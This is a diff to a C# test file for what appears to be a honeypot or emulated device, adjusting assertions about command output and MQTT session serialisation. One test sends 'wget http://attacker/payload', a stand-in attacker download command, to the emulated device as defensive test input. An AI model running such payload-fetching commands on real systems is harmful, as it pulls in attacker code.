@@ -73,7 +73,8 @@ public sealed class ComponentTests
         var download = await device.ExecuteCommandAsync("wget http://attacker/payload", CancellationToken.None);
 
         Assert.Equal("\r\nevidence", echo);
-        Assert.Contains("simulated", download);
+        Assert.Contains("Network is unreachable", download);
+        Assert.DoesNotContain("simulated", download);
     }
 
     [Fact]
@@ -110,5 +111,6 @@ public sealed class ComponentTests
         var json = JsonSerializer.Serialize(session);
         Assert.Contains("\"Protocol\":\"mqtt\"", json);
         Assert.Contains("\"Type\":\"mqtt.publish\"", json);
+        Assert.DoesNotContain("\"DownloadAttempt\"", json);
     }
 }
